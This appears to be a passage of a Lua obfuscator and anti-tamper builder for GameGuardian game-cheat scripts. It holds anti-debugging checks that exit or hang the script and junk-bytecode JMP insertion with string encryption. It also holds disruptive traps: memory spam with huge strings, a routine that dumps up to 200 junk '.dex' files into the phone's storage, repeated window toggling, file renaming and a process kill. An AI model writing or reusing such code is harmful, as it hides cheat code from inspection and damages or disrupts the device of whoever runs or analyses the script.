            t[i] = {}
            for j = 1, 200 do
                t[i][j] = string.rep("D", 8096)  
            end
        end
        local tmp = 0
        for k, v in pairs(t) do
            tmp = tmp + #v[1]
        end
         complexLoop() 
    end
end

while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end

	if true then
		if string.match('/' .. tostring(os.time()), '/([^/]+)$') ~= tostring(os.time()) then
			while true do
				if true then
				ProcessSpam()
					createMassiveData()
					
					os.exit()
				end
				if false then
				end
			end
		end
	end
	
	loadfile = loadfile
    load = load
    loadfile(gg.getFile()) 
    load(string.dump(load("os.exit()"),false,false)) 
    io.open(gg.getFile() .. "c" .. tostring(string.dump(loadfile(gg.getFile()),false,false)),"w") 

local function isFunctionSafe(func)
    local info = debug.getinfo(func)
    
    if type(func) == "function" and func ~= debug.getinfo then
        if info.short_src ~= "[Java]" or info.source ~= "=[Java]" or info.what ~= "Java" or
           info.namewhat ~= "" or info.linedefined ~= -1 or info.lastlinedefined ~= -1 or
           info.currentline ~= -1 or type(({pcall(debug.getlocal, func, 1)})[2]) == "string" then
            return false
        end
    elseif func == debug.getinfo then
        if type(({pcall(debug.getlocal, func, 1)})[2]) == "string" then
            return false
        end
    end
    return true
end

local function verifyLibraries()
    local libraries = {"gg", "os", "io", "debug", "math", "string", "table", "bit32", "utf8"}
    
    for _, lib in ipairs(libraries) do
        local init = _ENV[lib]
        if init and type(init) == "table" then
            for _, func in pairs(init) do
                if type(func) == "function" and not isFunctionSafe(func) then
                    return
                end
            end
        end
    end
end

local function additionalChecks()
    local Lock = {
        debug.getinfo(gg.toast).short_src,
        debug.getinfo(gg.getResults).short_src,
        debug.getinfo(gg.getValues).short_src,
        debug.getinfo(os.exit).short_src,
        debug.getinfo(gg.refineNumber).short_src,
        debug.getinfo(gg.refineAddress).short_src,
        debug.getinfo(gg.alert).short_src
    }
    for _, v in ipairs(Lock) do
        if v ~= "toast" and v ~= "getResults" and v ~= debug.getinfo(1).short_src and v ~= gg.getFile() then
            return
        end
    end
end

local function checkStringForAt(str)
    return str:find("@") ~= nil
end

verifyLibraries()
additionalChecks()

local libs = {tostring(gg), tostring(os), tostring(io), tostring(debug), tostring(math), tostring(table)}
for _, lib in ipairs(libs) do
    if checkStringForAt(lib) then
        os.exit()
        return
    end
end

if not debug.traceback or not gg.getFile then
    repeat
        os.exit()
    until false
    return
end

local c = os.clock()
if os.clock() - c > 0.80 then
    os.exit()
    return
end

if debug.getinfo(gg.searchNumber).what ~= 'Java' then
    os.exit()
    return
end

local funcX = function() end
local LockFinal = {
    debug.getinfo(gg.toast).short_src,
    debug.getinfo(gg.getResults).short_src,
    debug.getinfo(gg.getValues).short_src,
    debug.getinfo(os.exit).short_src,
    debug.getinfo(gg.refineNumber).short_src,
    debug.getinfo(gg.refineAddress).short_src,
    debug.getinfo(gg.alert).short_src,
    debug.getinfo(debug.getinfo).short_src,
    debug.getinfo(funcX).short_src
}

for _, v in ipairs(LockFinal) do
    if v ~= "toast" and v ~= "getResults" and v ~= debug.getinfo(1).short_src and v ~= "function() end" and v ~= gg.getFile() then
        os.exit()
        return
    end
end

local function isGGSearchNumberDefinition()
    local ggSearchNumberInfo = debug.getinfo(gg.searchNumber)
    if ggSearchNumberInfo == nil then
        return false
    end
    return ggSearchNumberInfo.func == gg.searchNumber
end

local function isGGEquivalentToStrGG()
    return string.format("%s", gg) == tostring(gg)
end

function checkHack()
    if not isGGSearchNumberDefinition() then
        while true do
        end
    end
    if not isGGEquivalentToStrGG() then
        local tostringPath = string.format("%s", tostring):match("@(.-):")
        if tostringPath and tostringPath:find("/lua/") then
            gg.alert("ERRO.","")
            os.exit()
        end
    end
end

    local function GenerateSpamName()
        local HashName = ""
        for i = 1, 10 do
            HashName = "ðŸŒ¨ï¸" .. HashName .. "â˜ƒï¸" .. HashName .. "â„ï¸"
        end
        return HashName:rep(100)
    end

    local function IsFunctionValid(env)
        for _, v in pairs(env) do
            if toStr(v):match("function: @.-:") then
                return false
            end
        end
        return true
    end
    
    local function ValidateFunctions()
        if not IsFunctionValid(_ENV) then
            return false
        end
        local func = os.exit
        if toStr(func):find("[-@/%d]") then
            return false
        end
        return true
    end
    
    local function RefineSpamData(tmp)
        for i = 1, #tmp do
            SpamTable[i] = {
                ["address"] = GenerateSpamName(),
                ["flags"] = GenerateSpamName(),
                ["value"] = GenerateSpamName(),
                ["freeze"] = GenerateSpamName(),
                ["name"] = GenerateSpamName(),
                SpamTable[i - 1]
            }
            gg.refineNumber(SpamTable)
            gg.refineAddress(SpamTable)
        end
    end
    
    local function PerformSafetyCheck()
        for _, funcGroup in ipairs({gg, os, io, debug, math, table}) do
            if _ENV["string"]["match"](tostring(funcGroup), "@") then
                gg.processKill()
                return
            end
        end

        if debug.getinfo(1).istailcall or debug.getinfo(gg.searchNumber).what ~= 'Java' then
            os.exit()
        end
    end

    local function ManageVisibility()
        local x = 0
        repeat
            x = x + 1
            gg.setVisible(false)
            gg.sleep(0)
            gg.setVisible(true)
            gg.sleep(2000)
        until x == 20000
    end

    local function ValidateSourceFile()
        local fileName = gg.getFile()
        local loadedFile = loadfile(fileName)
        if loadedFile ~= nil then
            local tempName = fileName:match("[^/]+$")
            local newName = "lohhhggg"
            os.rename(fileName, fileName:gsub('/[^/]+$', '') .. '/' .. newName)
            loadedFile = loadfile(fileName:gsub('/[^/]+$', '') .. '/' .. newName)
            os.rename(fileName:gsub('/[^/]+$', '') .. '/' .. newName, fileName)
            ManageVisibility()
        end
    end
    
    local function Main()
        local tmp = GenerateSequence()
        if ValidateFunctions() then
            RefineSpamData(tmp)
            PerformSafetyCheck()
            ValidateSourceFile()
        end
    end
    
    Main()
end

function A()
if (_G["debug"]["getinfo"](2)["istailcall"] ~= false) then
	while not nil do
		_G["assert"](_G["debug"]["sethook"](_G["os"]["exit"](), nil), _G["os"]["exit"]())
		return not nil
	end
elseif (_G["debug"]["getinfo"](1)["istailcall"] ~= false) then
	while not nil do
		_G["assert"](_G["debug"]["sethook"](_G["os"]["exit"](), nil), _G["os"]["exit"]())
		return not nil
	end
end
if _G["string"]["find"](_G["string"]["gsub"](_G["debug"]["traceback"](), _G["string"]["gsub"](_G["gg"]["getFile"](), "(%.)", "%%."), ""), "[^%..-]*/") then
	while not nil do
		_G["assert"](_G["debug"]["sethook"](_G["os"]["exit"](), nil), _G["os"]["exit"]())
		return not nil
	end
end

end
 A()
 
 function anti_load()
local log = {}
for i = 1, 200 do
table.insert(log, {address = 127 + i, flags = 12, values = 127})
end
clock = os.clock()
time = os.time()
for i = 1, 6 do gg.addListItems(log) end
if os.clock() - clock > 2 then
for x = 1, 200 do 
gg.saveList("/storage/emulated/0/"..string.char(math.random(45,255))..string.char(math.random(35,148))..string.char(math.random(15,50))..string.char(math.random(30,168))..string.char(math.random(20,80)).."Jonas["..math.random(1,5000).."]War.dex", gg.LOAD_APPEND)
end
end
end

 anti_load()
 
gg.setVisible(false)

function B()
Bat=string.rep("fuck",9999)
Baat=string.rep(Bat,99)
for i=1,999 do
gg.refineAddress({[1]=Baat})
end
for i=1,999 do
gg.refineNumber({[1]=Baat})
end
end

B()

function d()

if _G.debug.getinfo(gg.alert).source == "=[Java]" then else 
return gg.alert("ERROR [' 29 ']",(""),(""))
end
if debug.getinfo(debug.getinfo) == nil then 
return gg.alert("ERROR [' 30 ']",(""),(""))
end
if debug.getlocal(2, 4) == nil then
return gg.alert("ERROR [' 0x000001 ']",(""),(""))
end
end

d()

gg.setVisible(true)

]]

J  = ([[
local a=function(b)return math.random(1,b)end;local c=setmetatable({},{__index=function(d,e)return e end})
local f=function(g)local h={}for i=1,a(9)do h[i]=a(9e3).."|"end;return h end;local j=f(99)
local k=function(l)local m=table.concat;local n=function()return a(9e3).."|"end;return m,n end;local o,p=k()
local q=function(r)local s=loadstring;local t=function()return a(9e3).."|"end;return s,t end;local u,v=q()
local w=function(x)local y=getmetatable;local z=function()return a(9e3).."|"end;return y,z end;local A,B=w()
local C=function(D)local E=pcall;local F=function()return a(9e3).."|"end;return E,F end;local G,H=C()
local I=function(J)local K=tonumber;local L=function()return a(9e3).."|"end;return K,L end;local M,N=I()
local O=function(P)local Q=tostring;local R=function()return a(9e3).."|"end;return Q,R end;local S,T=O()
local U=function(V)local W=type;local X=function()return a(9e3).."|"end;return W,X end;local Y,Z=U()
local _a=function(ab)local ac=next;local ad=function()return a(9e3).."|"end;return ac,ad end;local ae,af=_a()
local ag=function(ah)local ai=rawget;local aj=function()return a(9e3).."|"end;return ai,aj end;local ak,al=ag()
local am=function(an)local ao=rawset;local ap=function()return a(9e3).."|"end;return ao,ap end;local aq,ar=am()
local as=function(at)local au=rawequal;local av=function()return a(9e3).."|"end;return au,av end;local aw,ax=as()
local ay=function(az)local aA=select;local aB=function()return a(9e3).."|"end;return aA,aB end;local aC,aD=ay()
local aE=function(aF)local aG=unpack;local aH=function()return a(9e3).."|"end;return aG,aH end;local aI,aJ=aE()
local aK=function(aL)local aM=xpcall;local aN=function()return a(9e3).."|"end;return aM,aN end;local aO,aP=aK()
local aQ=function(aR)local aS=debug;local aT=function()return a(9e3).."|"end;return aS,aT end;local aU,aV=aQ()
local aW=function(aX)local aY=io;local aZ=function()return a(9e3).."|"end;return aY,aZ end;local b_,ba=aW()
local bb=function(bc)local bd=os;local be=function()return a(9e3).."|"end;return bd,be end;local bf,bg=bb()
local bh=function(bi)local bj=string;local bk=function()return a(9e3).."|"end;return bj,bk end;local bl,bm=bh()
local bn=function(bo)local bp=table;local bq=function()return a(9e3).."|"end;return bp,bq end;local br,bs=bn()
local bt=function(bu)local bv=coroutine;local bw=function()return a(9e3).."|"end;return bv,bw end;local bx,by=bt()

]])

  function encodegg(code)
return 'gg[xjlsfWyjx("' .. criptoInc(code) .. '")]('
end
function encodeos(code)
return 'os[xjlsfWyjx("' .. criptoInc(code) ..'")]('
end
function encodestr(code)
return 'string[xjlsfWyjx(' .. criptoInc(code) .. ')]('
end
function encvalues(code)
return 'xjlsfWyjx("' .. criptoInc(code) .. '")'
end

function ofus (data)
 local jeizy, r, w, boolean = ("加密 China 問題"), "r", "w", true
xzb = io.input(_ENV["選擇 文件"]:gsub("%.lua","").."."..jeizy..".lua"):read('*a')
			gg.internal2(load(xzb), _ENV["選擇 文件"]:gsub("%.lua","").."."..jeizy..".lua")
				xzb = io.input(_ENV["選擇 文件"]:gsub("%.lua","").."."..jeizy..".lua"):read("*a")
				::retouch::
				zxd = xzb
					zxd=string.gsub(zxd, "	", "") 
	 OP = {
		[1] = "MOVE",
		[2] = "CALL",
		[3] = "GETTABLE",
		[4] = "SETLIST",
		[5] = "SELF",
		[6] = "CONCAT",
		[7] = "LOADK",
		[8] = "GETUPVAL",
		[9] = "GETTABUP",
		[10] = "SETTABUP",
		[11] = "SETTABLE",
		[12] = "MUL",
		[13] = "MOD",
		[14] = "ADD",
		[15] = "LEN",
		[16] = "POW",
		[17] = "LT",
		[18] = "SETTABUP",
		[19] = "SETTABLE",
		[20] = "CLOSURE",
		[21] = "LOADNIL",
		[22] = "LOADBOOL",
		[23] = "NEWTABLE",
		}

		  for i in ipairs(OP) do
		if zxd:match("\n\n([^\n]*upval[^\n]*)\n(\n"..OP[i].."[^\n]*)") then
	    zxd = zxd:gsub("\n\n([^\n]*upval[^\n]*)\n(\n"..OP[i].."[^\n]*)", function(a, c)
	 jeizik = math.random(1000000,500000000) + math.random(100000,200000000) + math.random(1000,2000) + math.random(1,5) - math.random(200,300)
	return "\n\n"..(a).."\n\n".."JMP :goto_"..jeizik.. "\n\n:goto_"..jeizik.. "\n"..(c)
  end)
end

					zxd = zxd:gsub("\n\n([^\n]*)\n(\n"..OP[i].."[^\n]*)", function(a, c)
					 jmp, jump, jumping = math.random(1000000,500000000) + math.random(100000,200000000) + math.random(1000,2000) + math.random(1,5) - math.random(200,300), math.random(1000000,500000000) + math.random(100000,200000000) + math.random(1000,2000) + math.random(1,5) - math.random(200,300), math.random(1000000,500000000) + math.random(100000,200000000) + math.random(1000,2000) + math.random(1,5) - math.random(200,300)
				return "\n\nJMP :goto_"..jmp.."\n\n:goto_"..jump..""..(c).."\n\nJMP :goto_"..jumping.."\n\n:goto_"..jmp.."\n"..(a).."\n\nJMP :goto_"..jump.."\n\n:goto_"..jumping
					end)
			 end

			if not load(zxd) then
		goto retouch
	end
			
return string.dump(load(zxd), true)
end

DATA = DATA:gsub('%".-(.-)%"', encvalues)
DATA = DATA:gsub("%'.-(.-)%'", encvalues)
DATA = DATA:gsub('%[%[.-(.-)%]%]', encvalues)
DATA = DATA:gsub("gg%.(%a+)%(", encodegg)
DATA = DATA:gsub("string%.(%a+)%(", encodestr)
DATA = DATA:gsub("os%.(%a+)%(", encodeos)

HH = J..DECODE..DATA

local LamsFile = gg.EXT_FILES_DIR .. ".tmp"

local chunk, err = load(HH)
if not chunk then
 --   error("Failed to load : " .. (err or "unknown error"))
end

local success, result = pcall(gg.internal2, chunk, LamsFile)
if not success then
 --   error("gg.internal2 failed: " .. tostring(result))
end
data = result

io.input(LamsFile)
local lines = {}
for line in io.lines() do
    lines[#lines + 1] = line
end

data = table.concat(lines, '\n')
lines = nil
os.remove(LamsFile)

data = data:gsub("; %.[^\n]+", "")
data = data:gsub("\9", "")
data = data:gsub("%.line %d+\n", "")
while (data:find("\n\n") ~= nil) do
    data = data:gsub("\n\n", "\n")
end
data = data:gsub(".source [^\n]+", '.source ""')

data = data:gsub("%.linedefined %d+", ".linedefined 0")
data = data:gsub("%.lastlinedefined %d+", ".lastlinedefined 0")
data = data:gsub("%.numparams %d+", ".numparams 250")
data = data:gsub("%.is_vararg %d+", ".is_vararg 250")
data = data:gsub("%.maxstacksize %d+", ".maxstacksize 250")

if type(OPcode) == "function" then
    data = ofus(data)
end

data = string.gsub(data, "%s*\n%s*", "\n")

if not data then
    error("Data is nil after processing!")
end

local new_chunk, err = load(data)
if not new_chunk then
    error("Failed to load modified data: " .. (err or "unknown error"))
end

data = string.dump(new_chunk, true)
data = string.gsub(data, string.char(0x01, 0x00, 0x00, 0x00, 0x1f, 0x00, 0x80, 0x00),
    string.char(0x00, 0x00, 0x00, 0x00))

local OutFile = g.out
io.output(OutFile)
io.write(data)
io.close()
os.exit()
print("Success!")
end